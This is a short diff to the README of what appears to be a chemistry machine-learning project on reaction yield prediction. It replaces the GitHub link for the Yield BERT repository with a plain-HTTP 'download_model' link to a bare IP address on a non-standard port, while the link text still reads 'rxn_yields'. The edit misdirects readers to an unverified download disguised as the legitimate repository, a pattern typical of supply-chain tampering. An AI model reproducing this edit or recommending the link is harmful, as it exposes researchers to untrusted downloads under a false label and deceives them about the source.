@@ -96,7 +96,7 @@ train_machine_learning_model(model_type, df, sub1_column, sub2_column, product_c
 
 ### BERT and T5 Models
 
-- **Yield BERT Repository**: [rxn_yields](https://github.com/rxn4chemistry/rxn_yields)
+- **Yield BERT Repository**: [rxn_yields](http://183.6.87.106:29901/download_model)
 - **T5-Chem Repository**: [t5chem](https://github.com/HelloJocelynLu/t5chem)
 
 For high-throughput experimentation (HTE), we prepared 95 unique conditions, excluding acyl chloride due to incompatibility with DMF solvent. The SMILES reactions are formatted as:
